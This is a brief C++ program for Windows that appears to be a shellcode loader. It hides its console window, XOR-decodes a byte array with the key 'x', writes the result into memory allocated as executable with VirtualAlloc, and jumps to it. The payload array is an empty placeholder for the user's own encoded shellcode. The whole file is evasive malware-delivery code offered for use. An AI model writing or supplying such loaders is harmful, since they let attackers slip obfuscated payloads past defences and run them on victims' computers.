#include <windows.h>
#include <iostream>
int main(int argc, char **argv) {

ShowWindow(GetConsoleWindow(), SW_HIDE);

char b[] = {/* your XORd, with key of ‘x’, shellcode goes here i.e. 0x4C,0x4F, 0x4C */};

char c[sizeof b];

for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}

void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

memcpy(exec, c, sizeof c);

((void(*)())exec)();

}